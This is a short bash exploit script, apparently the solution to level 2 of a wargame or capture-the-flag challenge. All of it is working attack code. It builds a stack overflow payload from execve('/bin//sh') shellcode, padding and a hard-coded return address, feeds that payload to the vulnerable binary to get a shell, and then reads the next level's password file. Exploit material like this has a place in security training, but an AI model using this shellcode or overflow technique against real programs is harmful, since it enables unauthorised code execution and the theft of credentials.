#!/bin/bash

GETPASS="cat /home/user/level3/.pass"

set -x

SHELLCODE="\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
PADDING=`python -c 'print("A" * 52)'` # OFFSET=80 - SHELLCODE_LENGTH=28
RETADDRESS="\x08\xa0\x04\x08"

echo -e "${SHELLCODE}${PADDING}${RETADDRESS}" > /tmp/exploit

(cat /tmp/exploit - | ~/level2) << EOI
    echo "\nid: \$(id)"
    echo "Next pass is:  \$($GETPASS)\n"
EOI